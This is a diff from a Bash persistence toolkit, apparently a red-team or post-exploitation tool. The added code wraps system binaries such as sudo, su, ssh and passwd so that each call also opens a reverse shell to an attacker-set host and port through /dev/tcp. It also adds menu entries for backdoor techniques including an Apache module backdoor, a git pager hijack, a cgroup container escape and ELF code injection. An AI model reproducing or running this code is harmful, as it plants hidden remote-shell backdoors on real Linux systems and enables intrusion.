+           printf '#!/bin/bash\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\nexec "%s.real" "$@"\n' "$MARKER" "$LHOST" "$LPORT" "$BIN" > "$BIN"; chmod 755 "$BIN"
+           echo -e "${GREEN}[+] Wrapper: ${BIN} (orig: ${BIN}.real)${NC}" ;;
+        3) for b in /usr/bin/sudo /usr/bin/su /usr/bin/passwd /usr/bin/ssh /usr/bin/git /usr/bin/curl /usr/bin/vim; do [[ -f "$b" ]] && file "$b" | grep -q ELF && echo "  $b"; done ;;
+        4) find /usr /bin /sbin -name "*.${MARKER}.bak" 2>/dev/null | while read -r f; do echo "  ${f%.${MARKER}.bak}"; done ;;
+        5) find /usr /bin /sbin -name "*.${MARKER}.bak" 2>/dev/null | while read -r f; do
+               ORIG="${f%.${MARKER}.bak}"; cp "$f" "$ORIG"; rm -f "$f" "${ORIG}.real"; echo "[+] Restored: $ORIG"; done ;;
+    esac
+}
+
 periodicPersist(){
     echo " [*] Periodic/Anacron Script Persistence (T1053) [*]"
     RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
@@ -4234,6 +4596,23 @@ menu() {
                                   [73] IGEL OS Persistence (T1546)
                                   [74] WSL Startup Folder Persistence (T1546)
                                   [75] Periodic/Anacron Persistence (T1053)
+
+                ═══════════════════════════════════════════════════════
+                               Malware-Sourced Techniques
+                ═══════════════════════════════════════════════════════
+
+                                  [76] Apache/Nginx Module Backdoor (T1505.003)
+                                  [77] Git Config Pager Hijack (T1546)
+                                  [78] /etc/profile.d Script Drop (T1546.004)
+                                  [79] OpenVPN Config Backdoor (T1546)
+                                  [80] iptables NAT Redirect (T1205)
+                                  [81] Tmpfiles.d Persistence (T1543.002)
+                                  [82] /etc/environment Injection (T1574.006)
+                                  [83] GNOME Shell Extension (T1546)
+                                  [84] network-scripts ifup Backdoor (T1546)
+                                  [85] Cgroup Release Agent Escape (T1611)
+                                  [86] Screen/Tmux Session Hijack (T1563.001)
+                                  [87] ELF Parasitic Code Injection (T1554)
 
     [*] Coming soon others features [*]
 
@@ -4393,6 +4772,30 @@ EOF
         wslPersist
     elif [ "$MENUINPUT" == "75" ] || [ "$MENUINPUT" == "75" ]; then
         periodicPersist
+    elif [ "$MENUINPUT" == "76" ]; then
+        apacheBackdoor
+    elif [ "$MENUINPUT" == "77" ]; then
+        gitConfigBackdoor
+    elif [ "$MENUINPUT" == "78" ]; then
+        profiledPersist
+    elif [ "$MENUINPUT" == "79" ]; then
+        openvpnBackdoor
+    elif [ "$MENUINPUT" == "80" ]; then
+        iptablesRedirect
+    elif [ "$MENUINPUT" == "81" ]; then
+        tmpfilesdPersist
+    elif [ "$MENUINPUT" == "82" ]; then
+        environmentInject
+    elif [ "$MENUINPUT" == "83" ]; then
+        gnomeExtension
+    elif [ "$MENUINPUT" == "84" ]; then
+        networkScripts
+    elif [ "$MENUINPUT" == "85" ]; then
+        cgroupEscape
+    elif [ "$MENUINPUT" == "86" ]; then
+        screenHijack
+    elif [ "$MENUINPUT" == "87" ]; then
+        elfInject
     else 
         echo "This option does not exist"
     fi
